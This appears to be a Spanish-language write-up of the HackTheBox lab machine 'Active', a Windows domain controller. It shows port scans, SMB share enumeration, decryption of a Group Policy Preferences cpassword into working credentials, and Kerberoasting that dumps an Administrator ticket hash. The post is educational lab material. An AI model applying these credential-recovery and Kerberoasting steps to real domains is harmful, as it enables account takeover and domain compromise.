---
layout      : post
title       : "HackTheBox - Active"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148banner.png
category    : [ htb ]
tags        : [ kerberos, cracking, SMB, DC ]
---
Máquina Windows nivel medio, de cabeza contra un **Domain Controller**, jugaremos mucho con **SMB** y sus carpetas compartidas, movimientos **SYS**tematicos y **VOL**taicos e.e, bastante crackeo de contraseñas y obtención de tickets para jugar con los perritos (**Kerberos**).

![148activeHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148activeHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [eks](https://www.hackthebox.eu/profile/302) & [mrb3n](https://www.hackthebox.eu/profile/2984).

LISTOOOOOOOOOOOOOOOOOOOOOO, nos enfrentaremos a un **Domain Controller** con mucho jugueteo.

Inicialmente tendremos una carpeta compartida en la cual tendremos un archivo que se genera gracias al **SYSVOL** llamado `Groups.xml`, dentro habrá unas credenciales, pero la contraseña estará cifrada, enumerando encontraremos la manera de crackearla, no nos servirán para entablar shells ni nada, pero podremos usarlas contra el servicio **SMB** de nuevo y tener acceso a nuevas carpetas compartidas, una de ellas es **Users**, ahí encontraremos la flag `user.txt` con respecto al usuario **SVC_TGS**.

Jugando con el servicio **Kerberos** lograremos obtener un **T**icket **G**ranting **S**ervice del usuario que está ejecutando el servicio **SMB** (**Administrator**), debemos crackearlo y apoyándonos de herramientas como **wmiexec** o **psexec** lograremos una terminal como **Administrator** en el **DC** :)

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Tiene vulnerabilidades más o menos conocidas y tirando a reales.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

¡Entonces, hagámoslo real!

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Vamos a empezar con nuestro escaneo de puertos:

```bash
ゝ nmap -p- --open -v 10.10.10.100 -oG initScan
```

| Parámetro  | Descripción |
| ---------- | :---------- |
| -p-        | Escanea todos los 65535                      |
| --open     | Solo los puertos que están abiertos          |
| -v         | Permite ver en consola lo que va encontrando |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

```bash
ゝ cat initScan
# Nmap 7.80 scan initiated Wed May 12 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.100
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.100 () Status: Up
Host: 10.10.10.100 () Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5722/open/tcp//msdfsr///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49152/open/tcp//unknown///, 49153/open/tcp//unknown///, 49154/open/tcp//unknown///, 49155/open/tcp//unknown///, 49157/open/tcp//unknown///, 49158/open/tcp//unknown///, 49169/open/tcp//unknown///, 49171/open/tcp//unknown///, 49180/open/tcp/////
# Nmap done at Wed May 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 103.03 seconds
```

* [Required ports to communicate with Domain controller](https://social.technet.microsoft.com/Forums/windows/en-US/1c6a59de-c1fe-4946-bb4e-1fe36fd40b08/required-ports-to-communicate-with-domain-controller?forum=winserverDS#ebc94ca4-80d9-47ba-80a7-8ed88301c06d-isAnswer).

Opa, un montón de puertos, listémoslos:

| Puerto | Descripción |
| :----: | :---------- |
| 53     | **[DNS](https://www.cs.ait.ac.th/~on/O/oreilly/tcpip/firewall/ch08_10.htm)** |
| 88     | **[Kerberos](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-user/Introduction.html#Introduction)** |
| 135    | **[RPC](https://techlandia.com/puerto-139-info_235022/)** |
| 139    | **[SMB](https://www.varonis.com/blog/smb-port/)** |
| 389    | **[LDAP](https://www.profesionalreview.com/2019/01/05/ldap/)** |
| 445    | **[SMB](https://www.varonis.com/blog/smb-port/)** |
| 464    | **[Kerberos Password Change](https://datatracker.ietf.org/doc/html/rfc3244.html)** |
| 593    | **[RPC web](https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc)** |
| 636    | **[LDAP SSL](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-ldap-over-ssl-3rd-certification-authority)** |
| 3268   | **[Global LDAP](https://informatics.perkinelmer.com/Support/KnowledgeBase/details/Default.aspx?TechNote=3142)** |
| 3269   | **[Global LDAP SSL](https://informatics.perkinelmer.com/Support/KnowledgeBase/details/Default.aspx?TechNote=3142)** |
| 5722   | **[Distributed File System Replication](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements)** |
| 9389   | **[Active Directory Web Services (ADWS)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-addm/59205cf6-aa8e-4f7e-be57-8b63640bf9a4)** |
| 47001  | **[WinRM](https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/)** |
| 49152,49153,49154,49155,49157,49158,49169,49171,49180 | Desconocidos |

Ahora hagamos un escaneo de scripts y versiones, así profundizamos en cada puerto:

**(Con la función de s4vitar extraemos los puertos fácilmente directo a la clipboard**

```bash
ゝ extractPorts initScan 

[*] Extracting information...

    [*] IP Address: 10.10.10.100
    [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49180

[*] Ports copied to clipboard
```

)**

```bash
ゝ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49180 -sC -sV 10.10.10.100 -oN portScan
```

| Parámetro | Descripción |
| ----------|:----------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
ゝ cat portScan
# Nmap 7.80 scan initiated Wed May 12 25:25:25 2021 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49180 -sC -sV -oN portScan 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.40s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-12 17:15:31Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   tcpwrapped
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5722/tcp  open   msrpc         Microsoft Windows RPC
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open   msrpc         Microsoft Windows RPC
49153/tcp open   msrpc         Microsoft Windows RPC
49154/tcp open   msrpc         Microsoft Windows RPC
49155/tcp open   msrpc         Microsoft Windows RPC
49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open   msrpc         Microsoft Windows RPC
49169/tcp open   msrpc         Microsoft Windows RPC
49171/tcp open   msrpc         Microsoft Windows RPC
49180/tcp closed unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7m29s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-12T17:16:29
|_  start_date: 2021-05-12T17:01:09

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 198.07 seconds
```

De las versiones simplemente obtenemos info del servicio **DNS**:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 53     | DNS      | 6.1.7601 |

Del escaneo podemos destacar:

* Un dominio: **active.htb**.
* Probablemente sea un **windows_server_2008**.

Pues a jugar y ver por donde logramos vulnerar lo que parece ser un [directorio activo](http://www.boostsolutions.com/blog/understanding-active-directory/) (:

* [Learn basics of active directory](https://blog.netwrix.com/2017/04/20/tutorial-learn-the-basics-of-active-directory/).

> **AD**: Sistema de **Windows** que gestiona el inicio de sesión de los usuarios dentro de la red de una empresa, o "dominio". Así se determina **a qué recursos puede acceder** esa persona (como archivos, carpetas, impresoras, otros equipos...) en la empresa. [Info sobre LDAP y AD](https://www.elgrupoinformatico.com/tutoriales/que-ldap-t74212.html).

...

### Puerto 135 - RPC [⌖](#puerto-135) {#puerto-135}

Podemos ver más info del controlador de dominio mediante la herramienta `rpcclient`, intentemos ingresar con una **null session**, ya que no tenemos credenciales:

```bash
ゝ rpcclient 10.10.10.100 -U '' -N
rpcclient $> enumdomusers
Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
```

Podemos ingresar, pero no logramos interactuar con sus funciones, así que F :(

...

### Puertos 389, 636, 3268, 3269 - LDAP [⌖](#puertos-ldap) {#puertos-ldap}

> **Lightweight Directory Access Protocol** (Protocolo Ligero de Acceso a Directorios), es un mecanismo importante en el inicio de sesión de los ordenadores en red, sobre todo dentro de las empresas. [Info sobre LDAP](https://www.elgrupoinformatico.com/tutoriales/que-ldap-t74212.html).

Siguiendo [esta guía](https://book.hacktricks.xyz/pentesting/pentesting-ldap#manual-1) podemos enumerar el servicio **LDAP** con la herramienta `ldapsearch`:

```bash
ゝ ldapsearch -h 10.10.10.100 -x -s base namingcontexts
...
dn:
namingContexts: DC=active,DC=htb
namingContexts: CN=Configuration,DC=active,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
namingContexts: DC=DomainDnsZones,DC=active,DC=htb
namingContexts: DC=ForestDnsZones,DC=active,DC=htb
...
```

Donde `-x` le indica que haga un null session y `-s` le pasa el objetivo, en nuestro caso que nos muestre los [namingContexts](https://ldap.com/dit-and-the-ldap-root-dse/) definidos por el servidor...

Obtenemos info que ya teníamos (DC=active.htb), pero ahora sabemos como está dividido y su estructura, nos sirve para seguir buscando con `ldapsearch`, ahora pasémosle el **DC** del cual queremos más info:

```bash
ゝ ldapsearch -h 10.10.10.100 -x -b "DC=active,DC=htb"
...
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v1db1
...
```

Pero al parecer no podemos hacer nada con el **null session** :( Veamos el servicio **SMB**:

> **Pa leer:** [Diferencias entre los puertos LDAP y LDAP SSL](https://informatics.perkinelmer.com/Support/KnowledgeBase/details/Default.aspx?TechNote=3142).

...

### Puerto 139, 445 - SMB [⌖](#puertos-smb) {#puertos-smb}

> Agreguemos el dominio `active.htb` al archivo [/etc/hosts](https://www.siteground.es/kb/archivo-hosts/), por si algo u.u

**Samba** en pocas palabras nos permite intercambiar archivos en una red.

> [Server Message Block (SMB)](https://www.ionos.es/digitalguide/servidores/know-how/server-message-block-smb/).

Veamos que sistema aparentemente soporta el **DC**:

```bash
ゝ crackmapexec smb 10.10.10.100
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
```

Jmmm, **Windows 6.1**? Pa tener en cuenta, veamos a que recursos tenemos acceso mediante un **null session**, para esto podemos usar **smbmap**:

```bash
ゝ smbmap -H 10.10.10.100 -u '' -p ''
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```

Opa, vemos varios recursos, pero solo tenemos acceso de lectura a uno llamado **Replication**, ahora aprovechemos el uso de `smbclient` para entrar en ese directorio compartido:

```powershell
ゝ smbclient //10.10.10.100/Replication -U '' -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

                10459647 blocks of size 4096. 5728737 blocks available
smb: \> cd active.htb
smb: \active.htb\> dir
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 05:37:44 2018
  Policies                            D        0  Sat Jul 21 05:37:44 2018
  scripts                             D        0  Wed Jul 18 13:48:57 2018

                10459647 blocks of size 4096. 5728737 blocks available
smb: \active.htb\> 
```

Bien, al parecer son varios recursos, para evitar ir de carpeta en carpeta, podemos descargar los archivos a nuestra máquina y jugar de la manera que queramos, usaremos `smbget` para hacer esto:

**(También podríamos hacer una montura del directorio, pero no me gusta, a veces va suuuuuuuuuper lento)**

```bash
ゝ smbget -R  smb://10.10.10.100/Replication -U ''
Password for [] connecting to //Replication/10.10.10.100: 
Using workgroup WORKGROUP, guest user
smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI
smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
smb://10.10.10.100/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
smb://10.10.10.100/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
smb://10.10.10.100/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
Downloaded 8,11kB in 31 seconds
```

**(Cuando nos pida la contraseña debemos ponerle un espacio)**

Listos, tenemos todo el directorio **Replication**, veámoslo:

```bash
ゝ tree
.
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts

21 directories, 7 files
```

...

## Explotación [#](#explotacion) {#explotacion}

Entre tantos directorios podemos detectar algunos archivos, pero despues de enumerar cada uno, vemos algo curioso en el objeto **Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml**:

```bash
ゝ cat Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
        <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
    </User>
</Groups>
```

😱 Algunas cosas para destacar:

```xml
* name="active.htb\SVC_TGS", con lo que parece ser un usuario del dominio `active.htb`.
* cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ". Una contraseña, ¿no? e.e
```

Bien, pues buscando info sobre el campo `cpassword` en la web, encontramos estos dos posts:

* [Active Directory Security - TAG: Cpassword](https://adsecurity.org/?tag=cpassword).

Hacen referencia a **Attack Techniques to go from Domain User to Domain Admin**, y uno de ellos habla del archivo **Groups.xml**, que casi siempre va a contener credenciales de un usuario del dominio...

Siguiendo el post nos indica que ese archivo (y otros) se generan gracias al **SYSVOL**:

> **SYSVOL** is the domain-wide share in Active Directory to which all authenticated users have read access. SYSVOL contains logon scripts, group policy data, and other domain-wide data which needs to be available anywhere there is a Domain Controller. [Passwords in SYSVOL](https://adsecurity.org/?p=2362).

También nos indica que cuando se genera un **GPP** ([Group Policy Preference](https://searchwindowsserver.techtarget.com/definition/Group-Policy-Preferences)) se asocia un archivo **XML** con información relevante (muy relevante):

> When a new GPP is created, there’s an associated XML file created in SYSVOL with the relevant configuration data and if there is a password provided, it is AES-256 bit encrypted which should be good enough…

Peroooooooo:

> Except at some point prior to 2012, Microsoft published the AES encryption key (shared secret) on MSDN which can be used to decrypt the password.

Bingo!

Así que de alguna forma podemos desencriptar la contraseña... Buscando herramientas para esto, encontramos [gpprefdecrypt.py](https://github.com/reider-roque/pentest-tools/blob/master/password-cracking/gpprefdecrypt/gpprefdecrypt.py), a la cual simplemente debemos pasarle el contenido encriptado y obtendríamos la contraseña en texto plano:

```bash
ゝ wget https://raw.githubusercontent.com/reider-roque/pentest-tools/master/password-cracking/gpprefdecrypt/gpprefdecrypt.py
ゝ python gpprefdecrypt.py 
Usage: python gpprefdecrypt.py CPASSWORD
```

```bash
ゝ python gpprefdecrypt.py "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

Opaaaaaaaaaa, tenemos una contraseña y al parecer es del usuario **SVC_TGS**, probemos con **crackmapexec** y veamos si son credenciales funcionales:

```bash
# Contraseña correcta
ゝ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
# Validando que realmente sea correcta
ゝ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'InvaliD4supuestam3nt3'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [-] active.htb\SVC_TGS:InvaliD4supuestam3nt3 STATUS_LOGON_FAILURE
```

Y sí, son válidas contra el **DC**...

Probándolas contra el servicio **WinRM** mediante la herramienta [evil-winrm](https://github.com/Hackplayers/evil-winrm) no logramos acceso a una PowerShell :( Pero jugando de nuevo con **smbmap** y **smbclient** tenemos acceso a otras carpetas compartidas:

```bash
ゝ smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

Entre los 4 directorios a los que tenemos acceso de lectura, uno de ellos se ve interesante, ¿cuál? e.e Pues si, el directorio **Users** ta mirándonos directamente a los ojos y desafiando nuestra habilidad de enumerarlo, así que juguemos con él :P

```powershell
ゝ smbclient //10.10.10.100/Users -U 'SVC_TGS'
Enter WORKGROUP\SVC_TGS's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 09:39:20 2018
  ..                                 DR        0  Sat Jul 21 09:39:20 2018
  Administrator                       D        0  Mon Jul 16 05:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 00:06:44 2009
  Default                           DHR        0  Tue Jul 14 01:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 00:06:44 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:57:55 2009
  Public                             DR        0  Mon Jul 13 23:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018

                10459647 blocks of size 4096. 5728465 blocks available
smb: \> 
```

De nuevo tenemos varios directorios, descarguemoslos, ahora hagamos uso del propio **smbclient** para esto:

```powershell
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
...
...
...
smb: \>
```

Listos, entre los archivos, en la descarga nos damos cuenta de que tenemos uno llamado **user.txt** (la flag) (?), validemos, porque si tenemos la flag (y es válida) entendemos que la carpeta **Users** está sincronizada en tiempo real:

```bash
ゝ cat SVC_TGS/Desktop/user.txt 
86d6...
```

Ingresándola como flag en **Hack The Box** nos damos cuenta de que es válida, por lo tanto confirmamos lo antes dicho :P

Jmmm, entonces nos queda ver como podemos obtener una terminal ya sea como el usuario **SVC_TGS** o directamente como **Administrator**, demos algunas vueltas para descubrir que hacer...

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Podemos ver los usuarios del dominio con [rpcclient](https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/) apoyándonos de las nuevas credenciales, pero también con una herramienta del conjunto [impacket](https://github.com/SecureAuthCorp/impacket/tree/master/examples) llamada [GetADUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py) que nos muestra esa información:

```bash
ゝ GetADUsers.py -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation

[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 14:06:40.351723  2021-01-21 11:07:03.723783 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 13:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 15:14:38.402764  2021-05-12 23:47:48.356719
```

Hay 4 usuarios, pero activos constantemente solo 2, **Administrator** y **SVC_TGS**.

...

Despues de intentar interactuar con las carpetas compartidas a ver si podíamos subir algo (no se pudo :P) y jugar con los demás puertos a ver si alguno tenía algo interesante, caemos en el servicio **Kerberos**.

...

### Puerto 88 - Kerberos [⌖](#puerto-88) {#puerto-88}

> **Kerberos** es un sistema de autenticación mutua, es decir, el cliente verifica y comprueba la identidad del servidor, mientras que el servidor acredita y verifica la identidad del cliente. [Pentensting AD](https://hardsoftsecurity.es/index.php/2019/05/18/poc-pentesting-en-active-directory/).

* [How does **Kerberos** works](https://www.tarlogic.com/en/blog/how-kerberos-works/).

Existen varios tipos de ataques que pueden ser llevados a cabo (o probados) ante un servidor **kerberos**, uno de ellos llamado **Kerberoasting**:

> Hay un tipo de cuentas que son específicas para la ejecución de un servicio. Generalmente, este tipo de cuentas disfrutan de privilegios excesivos y muchas veces también pertenecen al grupo de "Administradores de Dominio" en los controladores de dominio. [Kerberoasting](https://seguridad-ofensiva.com/blog/directorio-activo/kerberoasting/).

Por lo tanto hay cuentas "normales" que realmente están siendo usadas para ejecutar tareas privilegiadas y por el fondo hablarían como tal, cuentas privilegiadas :o

> El objetivo del **Kerberoasting** es recolectar tickets **TGS** (**Ticket Granting Service**: ticket que se presenta ante un servicio para poder acceder a sus recursos) para servicios que se ejecutan en nombre de cuentas de usuario del AD, no cuentas del sistema. [Attacking **kerberos** - Kerberoasting](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/).

Estos tickets pueden ser crackeados, pero claro, depende siempre de lo fuerte que sea la contraseña...

> Pa leer: [How to attack **Kerberos**](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html).

Podemos [apoyarnos de una herramienta](https://room362.com/post/2016/kerberoast-pt2/#impacket) de **impacket** llamada `GetUserSPNs.py` que valida el trasfondo de una cuenta y extrae los tickets correspondientes:

* Le pasamos el dominio/usuario:contraseña.
* La dirección IP del DC.
* Y con el parámetro `-requests` le decimos que haga una petición para que devuelta nos muestre los tickets.

A vel:

```bash
ゝ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2021-01-21 11:07:03.723783


[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Inicialmente vemos que el usuario **SVC_TGS** es administrador aparentemente del servicio **SMB** (Puerto 445), perfecto, por un lado tamos felices, pero por el otro vemos un error :(

```bash
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Con lo que debe ser un error de sincronización o algo por el estilo... Buscando el error en internet encontramos [esta respuesta en el foro **askubuntu**](https://askubuntu.com/questions/1010967/kerberos-authentication-clock-skew-too-great):

> ```bash
> sudo apt install ntpdate
> ntpdate domaincontroller.yourdomain.com
> ```

> Pa leer: [Acá tambien encontramos la solución al error](https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast).

Leyendo entendemos que el problema es que nosotros como clientes no estamos sincronizados con el servidor **kerberos**, por eso tamos K.O, pero apoyándonos de **ntpdate** podemos indicarle que nos haga ese favor, probemos:

```bash
ゝ ntpdate 10.10.10.100
13 May 23:24:25 ntpdate[267388]: adjust time server 10.10.10.100 offset +0.048002 sec
```

Y volvemos a validar:

```bash
ゝ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2021-01-21 11:07:03.723783             


$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$1e8922f5b27692b73e8d64c82e667ee3$cabea62f8331d74174f9a337ca68e1561f1e7060fe661c4e094c31a95e56993ddba0968faeb292a6f8ad99e4844fd30a323b9a9adb9888d61bb7b4e665c3dfa3c345ba2259eae481a1e569b3982711a6ceace7b0ef20f18288fad8f43595f2ca56edcc9eb86979a3f33890d7e9f8d6caeb9267fa410171378f59b316cc0ddd89079ae1e3e48c171630a4f45b7b7c0b449f1f3c6878ca31d94c664bb8f47f9706eb0e316cabdd86aaf0568d7f8ec8de5fc6cc1760c5372412812528f304b3a3345c5a122d3e5e5f817b307c8ffe0b54d75ef2fb0e7b46882632e427bd4a699887c982171465238d05f76b19efb8b2616f7c80e3907cfee77d673e11c1161c0c142e79479a034a0d1b7aeb164fa945363f9d3825ac4da71bda2527efd321f2773d613d13dd0e20bbc88ad49bc64c7572c40546bdbc55350cf3fec0ffb6ff9633e5eed99395b454b15fd1f329313ef4e21f13372e48d395dbeef7b4888f136232d17915c0ed0175a1bd97f5715a2473408bdf53170b59d0744ab8c3554b93595a2cd8726b69f31ca8a75f501f70a810d83e70dace0e8f6409fa4b8579000d352b0a55ebecc528b232367980a753c5a0e7dd4cfed288aa2da2c16332899fe4ee866c5d62ce28a2285d1e5f6fb98964ee2e105ddbeae3c0d5c0b50531ae42d61572995d971c2198ab38897e9d69defd62935f7eda31eea7f87ad921a8f67c4aac069c06ab7b39f947260db380bb9e02a644fba7c8d8e2abd60380d742ac3f6578e40256fc880017ac9b1309716ea4000872abc9f84ce5ec615d4366fff5800b3b3d921652ff9e4